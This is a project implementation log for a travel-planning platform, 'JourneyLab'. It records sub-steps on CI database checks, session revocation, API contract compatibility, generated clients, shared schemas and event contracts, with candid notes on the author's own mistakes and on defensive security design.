# JourneyLab — Implementation Log

| Field | Value |
| --- | --- |
| Owner | Implementing engineer per entry |
| Status | `READY` — **no entries yet; no implementation has occurred** |
| Cadence | One entry per sub-step, written in the same commit as the work |
| Last reviewed | 2026-08-05 |

Navigation: [Logs index](README.md) · [Bug register](BUG_REGISTER.md) · [Regression log](REGRESSION_LOG.md) · [Sub-step protocol](../02-delivery/SUB_STEP_PROTOCOL.md)

---

## Entry format

```markdown
## IMPL-NNN — STEP-NNN.MM — [Sub-step title]

| Field | Value |
| --- | --- |
| Date | YYYY-MM-DD |
| Author | |
| Requirements | REQ-… |
| Blast radius | BR-NNN (LOW/MEDIUM/HIGH/CRITICAL) |
| Commit | `<sha>` |
| Graph indexed commit | `<sha>` — matched HEAD? yes/no |

### What was built
Concrete description of the delivered behavior.

### Why this approach
The options considered and why this one. **If an obvious simpler approach was
rejected, say why** — this is the field future readers actually need.

### Decisions taken during implementation
| Decision | Alternatives | Rationale | Promoted to ADR? |
| --- | --- | --- | --- |

### Deviations from the step file
What differed from the plan, and why. If none, say "none".

### What surprised us
Anything that behaved differently from expectation. This is where the
expensive knowledge lives.

### Follow-up created
| Item | Type | ID |
| --- | --- | --- |

### Verification
| Check | Result |
| --- | --- |
| Sub-step tests | |
| Regression R1–R7 | see REGRESSION_LOG |
| detect_changes() scope | |
| Documentation updated | |
```

---

## Entries

## IMPL-034 — STEP-001.07 — Database-backed checks run in CI

| Field | Value |
| --- | --- |
| Date | 2026-08-13 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-PLAT-002, REQ-SEC-001, REQ-SEC-002 |
| Blast radius | [BR-037](blast-radius/BR-037-database-backed-ci.md) (MEDIUM, **confidence MEDIUM**) |
| Commit | see git log for this entry |
| Graph indexed commit | `5cd47bb` — matched HEAD at pre-change |
| Bugs closed | [BUG-023](BUG_REGISTER.md) |

### What was built

PostgreSQL in CI and in `pnpm ci:local`, migrations applied in both, R7 wired into
`pnpm verify`, and the five copies of the skip decision replaced by one. Guard
meta-suite 55 → **61**.

### The bug was not "CI lacks a database"

That was the visible half. CI ran **624 passed / 46 skipped** where local ran
**665 / 5** — forty-one database-backed tests skipping on every push — and
`pnpm test:security` was not in `pnpm verify` at all, so R7 had never run in CI in
the repository's history.

The reason it lasted six steps is the third cause: **the skip decision existed in
five copies**, one per test module. Asking the graph for the blast radius of one
returned `status: ambiguous` with five candidates. Five places taking the same
decision forty-one times a run, none able to change the others, none reporting it.

A fourth cause surfaced while consolidating: the modules read the DSN from **two
different environment variables** — `JOURNEYLAB_DATABASE_URL` in one and
`JOURNEYLAB_TEST_DSN` in four. Setting either in CI would have configured some
modules and left the rest pointed at localhost, producing connection failures in a
subset of tests with nothing explaining why.

### Adding the service is the easy half

On its own it is a fix that regresses silently. Rename the service, change its
health check, move the port — `_stack_up()` returns False and forty-one tests go
back to skipping under a green build.

So the deliverable is the **ratchet**: `JOURNEYLAB_REQUIRE_DB=1`, set in CI and the
mirror, makes a missing database a failure. It exists in two independent layers
(the suite and the `verify` wrapper) and each was seeded separately to prove it
holds alone.

`tests/e2e/smoke.sh` has printed "a skip is not a pass" since STEP-003. This is the
first time anything other than a human reading the output enforces it.

### Keeping `pnpm verify` usable without Docker

R7 exits 2 for "no database", and `&&` treats 2 exactly like 1 — so wiring the
suite in directly would have made the repository's headline command fail on any
machine without the stack running, for a CSS change.

Swallowing the 2 is worse: a green `verify` would then mean "isolation holds **or**
was never checked", which is how `BUG-023` survived.

`tests/guards/tenant-isolation-gate.sh` makes the difference explicit in one
readable place instead of leaving it an emergent property of `&&`: with the flag, a
skip fails; without it, a skip is tolerated and prints a box saying R7 **did not
run** and this is not a pass.

### What surprised me

**My warning box ran a command.** Backticks inside double quotes are command
substitution, so `` echo "│ Run `pnpm dev` …" `` **started the whole Docker stack**
while printing help text. I noticed because four containers reported healthy during
what should have been a message. A guard with a side effect is not a guard — and
this side effect would have masked the exact condition being reported, since after
printing, the database it had just called missing would have been running.

**A meta-test asserted one component's wording rather than the outcome.** The
ratchet lives in both the suite and the wrapper; the suite fires first, so my
assertion looking for the wrapper's message failed against entirely correct
behaviour. Rewritten to assert the outcome, plus a second case that disables the
suite's check to prove the wrapper's holds on its own.

### It found a real defect on its first run

The mirror's first run with a database failed: three tenant-context tests asserting
`count(*) == 1` against rows the **R7 shell script** creates as a side effect. They
passed on every developer machine, because R7 leaves its seed behind, and failed on
a clean schema. `BUG-024`.

Order-dependent on a different suite, in a different language, with nothing
recording the dependency — and invisible for six steps because the only environment
that was both clean and had a database did not exist until this sub-step created
it.

### What this sub-step cannot verify about itself

**The workflow YAML.** GitHub Actions `services:` blocks are interpreted by the
runner; nothing local executes them. `pnpm ci:local` provides its database by a
different mechanism — a container on a user-defined network — so the two paths
verify different things and neither proves the other. `BR-037` §3 records that the
workflow change is verified only by the push that follows, which is why that record
is MEDIUM confidence while the code around it is high.

### What was deliberately left undone

Redis, MinIO, NATS and Jaeger stay out of CI. No test depends on them, and adding
services nothing uses is cost without coverage. When one is needed, it gets the
same ratchet.

---

## IMPL-033 — STEP-002.08 — Server-side session store and revocation

| Field | Value |
| --- | --- |
| Date | 2026-08-12 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-SEC-003, REQ-SEC-001, REQ-PRIV-001 |
| Blast radius | [BR-036](blast-radius/BR-036-session-revocation.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `5086a8a` — matched HEAD at pre-change |
| Bugs closed | [BUG-022](BUG_REGISTER.md) |
| Enhancements logged | [ENH-002](ENHANCEMENT_LOG.md) — **PENDING**, not implemented |

### What was built

A session can now be ended by the server. Two tables, a store, revocation checked
at validation on both sides of the language boundary, and a cascade from membership
revocation. Python 648 → **665**, web 61 → **63**, R7 12 → **18**.

### Why it did not already exist

`BUG-022`, and it is a process failure rather than a coding one. `.05` recorded
server-side revocation as `PARTIAL` and **carried it to `.07`**. `.07` closed
`VERIFIED` listing four carried gaps — none of them this one. Meanwhile
`session.ts` carried a comment reading *"Server-side revocation is authoritative
and is what actually ends access"*, pointing at something that did not exist.

**Nothing failed, because a carry is prose.** `substep-docs.sh` checks that a
`VERIFIED` sub-step has its three records; it cannot check that a promise made in
one record was kept in another. So signing out cleared cookies and the token
already in the browser kept working, and revoking someone's role stopped their next
authorization check while leaving the token in flight untouched.

That is what left STEP-002 at 5/7 with nothing named that would close it.

### The design question: a guest session has no tenant

`REQ-SEC-001` says every row carries a tenant. A guest session precedes
authentication, so there is none.

A nullable `organization_id` was rejected because the RLS predicate would then have
to special-case NULL, which is the exact shape of a policy that later lets a real
row through. A sentinel "no tenant" organization was rejected because it gives
every guest the same tenant, so a bug leaking across guest sessions would look like
a legitimate same-tenant read.

Two tables. `sessions` is tenant-scoped with `organization_id NOT NULL` and RLS;
`guest_sessions` has no tenant column at all. Each invariant stays true instead of
one being weakened to cover both. The cost is two revocation paths, which is real
and visible rather than hidden in a mode flag.

### A hash format is a cross-language contract

Guest tokens are minted in TypeScript and stored by Python. They agree only if both
produce byte-identical hashes, and **no edge in the graph connects them** —
`BR-025` recorded that the TS/Python boundary is invisible.

A mismatch would surface as `unknown_token`, which is exactly what a forged token
looks like, so the symptom would not point at the cause. The test vector was
therefore generated by **running the TypeScript implementation**; a vector produced
by the code under test proves only that the code agrees with itself.

### Making the field required was worth the churn

`GuestSessionRecord.revokedAt` is `number | null`, required rather than optional.
Optional would let a call site that has not learned about revocation omit it and
get a valid session — the precise failure being fixed. Required meant the compiler
listed all five existing call sites and none could be missed.

### What surprised me

**My first mutation test was invalid and looked fine.** I dropped `FORCE` RLS on
`sessions` in the live database; R7 still passed. The suite **re-applies the
migration before asserting**, so it repaired the drift it then checked. A valid
seed had to go into the migration file. *A suite that heals the condition it tests
cannot fail on it*, and nothing revealed that until someone tried.

**The FORCE-RLS assertion named three tables.** Adding a fourth would have left it
unchecked while still passing — the same pattern as `BUG-021`. It now derives the
set from the schema: every table with an `organization_id` must force RLS. The next
tenant-scoped table is covered by whoever creates it.

**I misread a silent failure as success.** An edit script had `2>/dev/null` on it
and printed nothing; I read the absent success marker as done and moved on. The
files were unchanged. It cost one cycle and it is the same class of error as
trusting a check that cannot fail — the fix is to assert the success marker, not
to look harder.

### What was deliberately left undone

**Not wired into HTTP.** `apps/api` still declares no routes. The store exists and
is tested; connecting it to request handling belongs with the handlers in STEP-004.

**`.04`'s trip re-parenting stays partial**, blocked on the `trips` table in
STEP-007. Blocked, not forgotten, and now the only partial left in STEP-002.

**`ENH-002` is logged, not built.** A guard that parses carries and fails when a
sub-step closes without discharging them would have caught `BUG-022` — but building
a documentation guard inside a security sub-step is the widening the enhancement
log exists to prevent, and `ENH-001` was held to the same rule days earlier.

---

## IMPL-032 — STEP-004.08 — Backward-compatibility and consumer contract tests

| Field | Value |
| --- | --- |
| Date | 2026-08-12 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-PLAT-008 |
| Blast radius | [BR-035](blast-radius/BR-035-compatibility-tests.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `eb30a26` — matched HEAD at pre-change |
| Bugs closed | [BUG-021](BUG_REGISTER.md) |
| Enhancements logged | [ENH-001](ENHANCEMENT_LOG.md) — **PENDING owner decision**, not implemented |

### What was built

A breaking contract change now fails the build unless it carries a major version
bump. `tools/contract_diff.py` classifies, `tools/check_compatibility.py` decides,
`contracts/baseline/` is what it compares against, and
`tests/contracts/test_consumer_contracts.py` records what a consumer relies on.

Python suite 592 → **648**. Guard meta-suite 47 → **55**.

### The whole idea is that direction decides the verdict

Request and response schemas have **opposite** compatibility rules. Adding a
required property breaks every client of a request and is harmless in a response.
Making a required property optional is a courtesy in a request and breaks every
consumer of a response. Every rule inverts.

So the classifier does not look at schemas in isolation. It walks from the
operations, records which position each schema is reachable in, and applies the
matching ruleset — with a schema reachable from both, like `Money` and `Problem`,
checked under both and taking the worse verdict.

Half the tests are written as pairs asserting **opposite** severities for the same
structural edit. That shape was chosen because the two obvious wrong
implementations both pass half a normal suite: a direction-blind classifier gets
one of each pair right, and a classifier that calls everything breaking gets every
breaking case right. Neither survives the pairs.

### The audit I promised at .07, and what it cost to keep

The `.07` record committed `.08` to hunting the existence-versus-capability
assertion pattern deliberately. That hunt found **two real defects** (BUG-021):
`JobEvent.sequence` and `ScenarioSetGenerated.model_versions` were optional while
their own descriptions promised gap detection and reproducibility.

`sequence` is the one worth remembering. In a stream where some events carry a
sequence and some do not, **a missing number proves nothing** — you cannot tell a
dropped event from an event that never had one. Optional sequencing does not weaken
gap detection, it removes it, while looking exactly like it is there.

Four sub-steps of ordinary work had not surfaced these. Twenty minutes of grepping
`assert "x" in ...properties` did. **The pattern is findable when hunted and
invisible when not**, which is the argument for scheduling audits rather than
relying on noticing.

### Three mistakes of my own, and one of them twice

**I asserted a threshold instead of a property.** My orphan-schema test asserted
`len(orphans) <= 2` and failed on three. Raising it to 3 would have gone green and
tested nothing — the same defect I was auditing for, committed while auditing for
it. The real property is that an unreferenced schema must be a bare `$ref` alias
(a named export) rather than an inline definition nobody references.

**I named a schema that does not exist.** The consumer expectations referenced
`TripCreate`; the contract calls it `CreateTripRequest`. Written from my assumption
of the contract rather than from the contract, which is the exact failure named in
the STEP-003 e2e work.

**My tool reported "no differences" about a contract I had just changed.** The
classifier treated safe required-ness changes as nothing to report, so tightening
`JobEvent.required` produced the output *"no differences from the baseline"*. The
verdict was right and the report was a lie, and a reader trusts the report. Safe
and absent are different answers; both directions are now reported, additive ones
included.

### The bypass, and the limit of what a guard can do about it

Any compatibility gate can be defeated by moving the baseline. `BASELINE.md`
records a digest of the snapshot and the gate recomputes it, so a moved baseline
fails the build.

This does not make the bypass impossible — the author can edit both files — and
`BASELINE.md` §3 says so in those words. What it does is convert a silent edit into
**a claimed release that did not happen**: a specific, recorded, reviewable false
statement. Writing that limitation into the artefact seemed better than letting the
next reader assume the check is stronger than it is.

The digest is used instead of git history because `git diff HEAD` cannot see an
uncommitted baseline, answers differently either side of the commit that introduces
one, and needs history a shallow CI clone does not have — the same argument that
chose a committed snapshot over a git tag.

### What was deliberately left undone

**AsyncAPI is not diffed.** Event compatibility turns on delivery semantics and
`DEC-009` is open; writing the rules now would bake in the assumption this
repository has refused to make. The snapshot includes `asyncapi.yaml` so the
baseline is complete. Carried to `STEP-006`.

**Semantic change is not detected** — `CONTRACT_CHANGE_POLICY` §1's most dangerous
category, invisible to a structural diff by construction. `ENH-001` proposes
detecting the *documented* subset via description drift and is **logged, not built**:
the enhancement log's rule 1 says an enhancement is never implemented silently
inside another sub-step, and its real risk is teaching people to click through a
warning.

---

## IMPL-031 — STEP-004.07 — Client generation and no-hand-edit enforcement

| Field | Value |
| --- | --- |
| Date | 2026-08-11 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-PLAT-007 |
| Blast radius | [BR-034](blast-radius/BR-034-generated-clients.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `73a2780` — matched HEAD at pre-change |
| Bugs closed | [BUG-020](BUG_REGISTER.md) |

### What was built

`contracts/openapi.yaml` stopped being a document that tests read and became a
source that code is built from. `tools/gen_clients.py` emits a TypeScript client
(2,022 lines) and a Python one (71 Pydantic classes) from the single contract.

Enforcement is `tests/guards/generated-clients.sh`: regenerate, then diff. It
catches a hand-edited client and a stale one with the same check and **cannot tell
them apart** — which is correct, because both mean the committed client is not what
the contract describes, and the remedy is identical.

### Why not a "DO NOT EDIT" header

A header is advice. Somebody editing a generated file to fix an urgent bug keeps
the header, and the next regeneration reverts their fix **silently** — worse than
either failing or succeeding, because the fix disappears without a trace and the
bug returns. The guard fails the build instead.

### The generator found a contract defect that 470 assertions had read past

`Evidenced.conflicts[].source` was `{type: object}` and emitted as
`Record<string, never>` — a conflicting source that cannot state who it is.
BUG-020, fixed here by composing the entry from the same shared schemas as the
claim it disputes.

Every Python test agreed the contract was fine, because they were reading the same
document that was wrong. The generator produced a **different representation**, and
`Record<string, never>` is a shape a human notices instantly. Generating a client
is not only a delivery mechanism; it is a second reader of the contract.

The test that missed it asserted `"conflicts" in properties` — a key, not a
capability. That is now the fourth assertion in this step written against the
existence of a thing rather than the property the requirement names (`.02`, `.03`,
`.06`, and this one). It has stopped being a coincidence and is called out in the
sub-step record as something `.08` should look for deliberately.

### The TypeScript side had no tests, and `tsc` was not one

`tsc --noEmit` proves the generated file parses. It would pass just as happily if
every schema had collapsed to `unknown` — which is a live risk, because `.06` moved
four schemas into external `$ref`s and an unresolved external ref **degrades rather
than errors**. `Money` becoming `unknown` would typecheck cleanly here and then
accept a float at every call site in the product.

`packages/contracts/src/contract.assert.ts` holds 8 assertions written with an
`Exact<>` helper rather than `extends`, because `extends` is satisfied by `unknown`
on the right-hand side — precisely the degradation being guarded against. All 8
were mutation-tested: each was seeded with a plausible wrong type and each failed
the build.

### Third time the missing compiler API has broken a tool

`openapi-typescript` v7 builds output through `ts.factory.*`. TypeScript 7 ships
no JavaScript compiler API (`ADR-009`). Pinned to v6, with the reason recorded at
the pin. BUG-017 was Next's type-check step, BUG-018 the token generator. Three
tools assuming a JavaScript compiler API exists is a property of the ecosystem, not
bad luck — and the next generator added to this repository should be checked for it
before it is chosen, not after.

### What surprised me

**The Python generator emits a header it never checks.** `--custom-file-header` is
inserted verbatim, so a plain prose header produced a module that failed at import
with `SyntaxError: invalid character '—'`. The generator does not verify that its
own output parses.

**I copied a tsconfig from a package with nothing in common with this one** —
`types: ["node"]` without the dependency, `jsx` with no components, and
`allowImportingTsExtensions` for tooling that does not exist here. `TS2688` on the
first typecheck. Copying configuration is how a package acquires requirements
nobody chose.

**`package.json` exported a file that did not exist.** Nothing imported the package,
so nothing failed. A broken entry point stays invisible until the first consumer,
which is the worst possible moment to discover it.

**The graph exclusion works and my control is not what makes it work.** The
requirement is met — at `7b1489e` a Cypher query returns no nodes under either
generated path. But `.gitnexusignore` is not the cause: adding and removing the
generated directories from it produces an identical index (353 files, 5,702 nodes,
7,993 edges), because **GitNexus already skips `generated/` by default**.

The file is not broken. A control probe — ignoring `tools/gen_clients.py` instead —
removed 16 nodes, so the mechanism is functional and the null result is real rather
than a mis-written pattern. That probe is the only reason the other two measurements
mean anything.

I nearly shipped this as "exclusion verified", which would have been true of the
outcome and false about the cause, and the difference shows up the day somebody
relies on the file to exclude something new. It is kept — a default is somebody
else's decision and can change — but BR-034 §4 now says what it does and does not
do.

### What was deliberately left undone

**AsyncAPI generates nothing.** `DEC-009` (queue versus Kafka) is open and the event
client's delivery semantics depend on it. Generating one now would bake in an
assumption this repository has explicitly refused to make. Carried to `STEP-006`.

---

## IMPL-030 — STEP-004.06 — Shared JSON Schemas including model-output schemas

| Field | Value |
| --- | --- |
| Date | 2026-08-11 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-PLAT-005, REQ-AI-002 (enforcing REQ-AI-001, REQ-AI-004, ADR-002) |
| Blast radius | [BR-033](blast-radius/BR-033-json-schema-library.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `e1d3194` — matched HEAD at pre-change |

### What was built
Five shared schemas in `contracts/jsonschema/`, `openapi.yaml` refactored to
reference four of them, and the AI-001 model-output schema. 40 assertions.
Python suite 552 → **592**.

### The sub-step was a refactor and I nearly missed it
§5 asks for "reuse enforced — no duplicate inline definitions". Creating the
library alone would have **produced** the duplication it forbids: `Money` and the
provenance and time fields were already inline in `openapi.yaml`, put there by
`.01` and `.02` when nothing else needed them.

So `.06` had to change contracts already marked `VERIFIED`. `Evidenced` moved
from restating `source`, `confidence` and the three time fields to composing
`Provenance` and `TemporalValidity`. Equivalent in shape, but its required set
changed — which under `CONTRACT_CHANGE_POLICY` is **breaking the moment a
consumer exists**. Nothing consumes it yet, and `.07` generates clients next.
Doing it now rather than after was the whole difference between a refactor and a
migration.

**One of the two broken tests would have gone vacuous rather than red** had I only
added the library. It read `schemas["Money"]["properties"]`, and after a bare
`$ref` there are no `properties` — so the assertion would have iterated an empty
set and passed. It now asserts the `$ref` exists first, then follows it.

### The model-output schema is where "never" becomes enforceable
`ADR-002` gives feasibility to deterministic engines and language to the model.
`REQ-AI-001` says model output can never mutate trip state without validation.
`trip-brief-extraction.json` is where that stops being a sentence.

**`source_span` is required, and it is the most useful field in the file.** A
model claiming the traveller is "travelling with a dog" must point at the
characters that say so. An extraction whose span does not contain its claim is
caught by a deterministic check rather than by the reader's memory of what they
typed — which is the only defence against a fluent hallucination that nobody
actively disbelieves.

`additionalProperties: false` everywhere, so an unexpected `tool_call` is
rejected rather than ignored: a model returning a field we did not ask for is a
model doing something we did not design, and ignoring it means never finding out.

**Confidence is per field, not per extraction.** A model can be certain about the
dates and guessing about the accessibility requirement; one number averages those
into something true of neither, and the interface then shows one badge while the
traveller cannot tell which half to check.

`value` is deliberately untyped. The deterministic validators own date, currency
and unit parsing — a schema that accepted the model's own idea of a date would be
trusting the thing it exists to check.

### What the schema cannot do, written into the schema
It checks shape, not truth. It cannot tell whether "2 hours" was really said or
whether "step-free" meant the hotel or the ferry. It is the **first gate of
three**: schema, then deterministic validators, then the human confirmation
`AI-001` requires.

A test asserts that sentence is present in the description, because a reader who
believes the schema validates meaning will skip the two gates that follow it.

### The three time axes, kept apart
`observed_at` (the source said it), the effective window (it is true in the
world), `recorded_at` (we wrote it down). A ferry timetable observed in March,
effective until October, recorded in April is not stale in June — and a system
with one timestamp cannot express that. It will either discard good data or serve
expired data, depending on which meaning the single field happened to get.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Generate clients from these schemas | STEP-004.07 |
| Unify the AsyncAPI envelope with this library — **not claimed here** | STEP-004.08 or STEP-006 |
| Prompt content and retrieval configuration | STEP-009 |

---

## IMPL-029 — STEP-004.05 — AsyncAPI event contracts (EVT-001…008)

| Field | Value |
| --- | --- |
| Date | 2026-08-11 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-PLAT-006, REQ-DATA-008 (enforcing REQ-SEC-001, REQ-PRIV-006/007, REQ-CONS-006) |
| Blast radius | [BR-032](blast-radius/BR-032-asyncapi-events.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `d2f950b` — matched HEAD at pre-change |

### What was built
`contracts/asyncapi.yaml` — eight events, one shared envelope, and an explicit
delivery guarantee, partition key, retention and replay note on each. 60
assertions. Python suite 492 → **552**.

### "No content in payloads" is a tenancy control, not privacy tidiness
`EVENT_CONTRACTS.md` §1 requires payloads to carry IDs, versions and
classifications only. That reads like a preference. It is not.

**An event is read by consumers that never authenticated the user who caused
it.** `EVT-001` alone reaches evidence assembly, the knowledge graph and
analytics. A payload carrying constraint values hands all three data nobody
checked they may see — and the check cannot be retrofitted, because the data is
already in the log and in every replica of it.

So payloads carry IDs, and a consumer needing content reads it back through an
authorized API where the boundary is applied per request. Asserted by scanning
every payload property against 24 content-shaped names across all eight events,
plus a meta-test proving the scan finds a seeded `accessibility_needs`. Payloads
are additionally closed.

`EVT-001` is the clearest case. A constraint is the traveller's own words about
their accessibility needs, their budget and who they travel with. **The event
carries four integers.**

### The guarantee that is usually stated wrongly
`exactly-once-effect`, not `exactly-once`. No transport gives exactly-once
delivery; anything claiming to is deduplicating somewhere and calling it a
guarantee. What is required is that the **effect** happens once, which is the
consumer's obligation — so the contract names the obligation rather than implying
the transport absorbs it.

Three events carry it, and they are the three where a duplicate does real damage:
a second booking handoff, a repair applied twice, a corrupted audit trail.
Everywhere else a duplicate is merely wasteful.

### Two events are deliberately not keyed by trip
A deletion request spans every trip a subject has; provider health is not a
property of a trip at all. Keying either by `trip_id` would look consistent and
be wrong — and the failure would be a rare, load-dependent ordering bug.

### The deletion event outlives what it describes
`EVT-007` is the proof artifact for `REQ-PRIV-006`, retained for a legally
required minimum — longer than the data whose destruction it records. So
`subject_ref` is **pseudonymous**, and a test asserts no `user_id` or `email`
appears: a proof of deletion carrying the person's identity defeats the act it
proves.

Failure reasons are codes, not prose, because a prose reason eventually contains
the row it failed on. And failure **emits** rather than staying silent — silence
is indistinguishable from a crashed producer.

### DEC-009 confirmed rather than assumed
The sub-step asked to confirm that queue-versus-Kafka changes the transport and
not the contract. It does, and that is now **enforced**: no `servers` block, no
channel `bindings` — the two places AsyncAPI lets a transport leak in — with a
test asserting both absences. Answering DEC-009 later cannot quietly bind the
contract to the answer.

### A pre-change check with no applicable query
This sub-step adds one YAML document and one test module and changes no Python
symbol. I ran `detect_changes()` and recorded that **no symbol-level query was
applicable**, rather than running an irrelevant one to produce a LOW. The protocol
asks for a pre-change check, not for a query, and a number obtained by asking the
wrong question is worse than an honest absence.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Transactional outbox that refuses an unstamped envelope | STEP-006 |
| Consumer implementations | Their own steps |
| `DEC-009` — managed queue or Kafka | Before STEP-006 |

---

## IMPL-028 — STEP-004.04 — Privacy, admin, coverage and job operations (API-015…018)

| Field | Value |
| --- | --- |
| Date | 2026-08-11 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-PLAT-005, REQ-PRIV-005 (enforcing REQ-PRIV-006/007, REQ-EVID-006, REQ-NFR-004) |
| Blast radius | [BR-031](blast-radius/BR-031-platform-operations.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `6ea8436` — matched HEAD at pre-change |

### What was built
Six operations and 8 schemas: privacy requests with per-store tracking, curator
overrides with four-eyes, public coverage, and job streaming with cancellation.
23 assertions. Python suite 469 → **492**. STEP-004 is now 4/8 with **22
operations declared**.

### The graph gave me a confidently wrong answer
`impact(CLIENT_VISIBLE)` returned **`0 impacted`, `risk: LOW`, `epistemic:
exact`** for a constant with five references across two files.

**That is worse than the degraded concept search**, and worth being precise
about. The FTS gap at least emits a warning. This emits a guarantee: a pre-change
check targeting a module-level constant reports a clean blast radius for a symbol
with real dependents, and `epistemic: exact` invites the reader to stop looking.

Six limitations are now recorded across BR-024 through BR-031: workspace aliases,
JSX components, CSS, the concept search, duplicate indexing, and now imported
constants. Functions are traced correctly and usefully — `impact(problem)` and
`impact(safe_detail)` both returned real callers and processes. **The tool is
reliable for one shape of symbol and silently unreliable for several others**, and
a `0 impacted` result is only trustworthy for a Python function.

### Correcting something I said
I stated that `auth/errors.py` would migrate to RFC 9457 at `.04` and that
invitation redemption would land here. **Neither is true.** `.04` is privacy,
admin, coverage and jobs, and STEP-004 declares contracts only — no route handler
exists anywhere in the repository, so a migration has nothing to be verified
against. Both carry to the implementing steps.

### One public operation, counted rather than assumed
`getCoverage` is the only operation that declares `security: []`. A test **counts
them**, so a second one added by accident is visible rather than inherited.

Public is right: a traveller must be able to learn their destination is
unsupported without registering to be told no. What must not leak is *how* it is
supplied — so `provider_health` is a single aggregate enum, never a list, a name
or a count, each of which reveals the shape of the supply chain. `Coverage` and
`CoverageRegion` are closed, and a test asserts eight leak-shaped names are absent
rather than that the current fields look acceptable.

### Privacy made verifiable rather than assertable
`REQ-PRIV-006` names seven stores — primary, object, vector, graph, cache, export,
token. The record tracks each individually.

A single `complete` boolean goes true when the easy stores finish. `partially_failed`
is therefore a distinct state: six of seven is not complete, and calling it
complete is precisely the failure `REQ-PRIV-007` guards against. Acceptance is
`202` and never `200`, because the work continues after the response.

### A control the organisation cannot currently satisfy
`status` is absent from the override request schema, which is closed — a caller
that could ask for `active` could skip four-eyes. The server decides, and
high-impact overrides are created `pending_approval`.

The contract names a **second curator**, matching the authorization matrix.
`DEC-010` has not resolved whether an `ops_admin` may stand in, so the contract
declares only what the matrix states.

**With a single owner, four-eyes is structurally unsatisfiable** (`ADR-010`). The
contract declares the control correctly; satisfying it is an organisational
problem `STEP-021` cannot ship without.

### Heartbeats are the design, not a detail
Without them a client cannot distinguish a job that is thinking from a connection
that died — and a traveller watching a spinner cannot either. The stream also
carries warnings, because a generation that succeeded while three providers were
degraded is not the same as one that succeeded cleanly. Cancellation is `202`, not
`204`: a job stops at a safe point, and claiming it already has is a lie the
client acts on.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Migrate `auth/errors.py` once handlers exist | STEP-008 onward |
| Invitation redemption + the `invitation_expired` 403 conflict | STEP-015 |
| `DEC-010` — may an `ops_admin` be the second approver? | Before STEP-021 |
| Six graph limitations | STEP-026 |

---

## IMPL-027 — STEP-004.03 — Collaboration, booking, live and feedback (API-010…014)

| Field | Value |
| --- | --- |
| Date | 2026-08-11 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-PLAT-005 (enforcing REQ-BOOK-004, REQ-SEC-008, REQ-CONS-011, REQ-PRIV-003, REQ-EVID-003) |
| Blast radius | [BR-030](blast-radius/BR-030-collab-booking-live-feedback.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `dd01499` — matched HEAD at pre-change |

### What was built
Seven operations and 11 schemas covering invitations, booking handoff,
activation, repair generation and acceptance, and feedback. 29 assertions.
Python suite 440 → **469**. Phase 2–3 surfaces, specified now so later steps
implement against a stable shape instead of inventing one.

### The absence of a field is the control
`TST-BOOK-002` asks that no schema permit a payment credential. The assertion
scans **every property name in the whole document** against 21 payment-shaped
names, rather than reviewing the booking schemas — review is what fails on the
eighteenth operation added two years from now.

A test that searches for something absent passes identically when the search is
broken, so a second test seeds `card_number` into a synthetic document and
requires the same walk to find it. `BookingHandoff` is also a **closed** object,
because an open one is somewhere a credential arrives undeclared.

**PCI scope you never enter is scope you cannot leak.** JourneyLab deep-links and
records attribution; it never sees a card, and now it has nowhere to put one.

### Estimated and confirmed are states, not a flag
A boolean `is_confirmed` makes an estimate and a confirmation the same field with
different values, which is how a default of `false` becomes a default of `true`
in somebody's mapper — and `REQ-EVID-003` exists precisely to stop an estimate
being rendered as confirmed. Three named states also express `cancelled`, which a
boolean cannot. A test forbids the boolean spellings from reappearing anywhere.

### Repair generation is separated from acceptance by shape, not by rule
`generateRepairs` returns options and changes nothing; `acceptRepair` is the only
operation in the contract that alters a live plan in response to a disruption.

The separation is enforced by their signatures: generation does **not** take
`If-Match` and acceptance does. Requiring a version precondition on a read-only
projection would imply it mutates, and the next person to touch it would make
that true.

The product reason: a traveller mid-trip must be able to look at what a
disruption costs without committing. A single operation that generated and
applied would replan their afternoon while they were still reading option one.

### Invitations, where a link is a credential
`expires_at` is required with no default. `role` excludes `trip_owner` —
transferring a trip is a deliberate act, not something you can forward. The token
is returned **once** and a test asserts no read operation can return it, because
a collaboration link an API hands back is a link an attacker asks for. Revocation
is immediate and irreversible; reissuing is cheap, and a reversible revocation is
one the holder can wait out.

### Silence is not dissatisfaction
`consent_scope` is required on feedback, with the narrowest option first, because
feedback is training signal and using it without a stated scope uses someone's
trip to improve a model they did not agree to improve.

**No field can record that feedback was not given.** The moment one exists,
something treats silence as a negative label — and a traveller who simply got on
with their holiday is not an unhappy one. Asserted against five spellings.

### A conflict I recorded rather than resolved
The register lists `collaboration.invitation_expired` at **403**, described as
"fail closed, leak nothing". Those are in tension: an attacker guessing tokens
learns which guesses are real if "expired" is distinguishable from "never
existed".

No operation here returns it — redemption is not declared — so nothing is wrong
today. When redemption is designed it must use the indistinguishable denial and
the 403 will need revisiting. Flagged for `.04` rather than changed now: altering
a security-relevant status with no operation to test it against is a change
nothing exercises.

### One more graph observation
`impact(ERROR_CODES)` returns **ambiguous** — the same declaration indexed twice,
as `Property` and as `Variable`, both at line 35 — and both candidates report 0
impacted, which is also wrong, since the constant is imported by three modules.
Minor beside the JSX, CSS and FTS gaps, recorded for the same reason: a tool that
answers confidently and wrongly is worse than one that declines.

### What is NOT met
`DATA-013` and `DATA-015` are referenced and undefined, joining `DATA-006`,
`009`, `010`, `011`, `012`, `014`. STEP-006 owns the canonical data model.

### Follow-ups
| Item | Owner step |
